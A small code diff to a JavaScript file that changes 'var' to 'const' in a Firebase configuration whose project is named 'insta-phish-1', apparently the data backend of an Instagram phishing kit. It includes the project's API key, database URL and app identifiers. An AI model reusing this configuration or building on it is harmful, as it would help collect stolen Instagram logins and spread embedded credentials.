@@ -4,8 +4,7 @@
 ///Edit Under This
 
 
-
-var firebaseConfig = {
+const firebaseConfig = {
   apiKey: "AIzaSyBVGlNfvFj7p-XrQZsvgahxdJU66hRK3Yc",
   authDomain: "insta-phish-1.firebaseapp.com",
   databaseURL: "https://insta-phish-1.firebaseio.com",
@@ -14,8 +13,10 @@ var firebaseConfig = {
   messagingSenderId: "402413515512",
   appId: "1:402413515512:web:a2438eeb9ae91f2e0ec10d",
   measurementId: "G-KF262QM7Z4"
-
 };
+
+
+
 
      
  
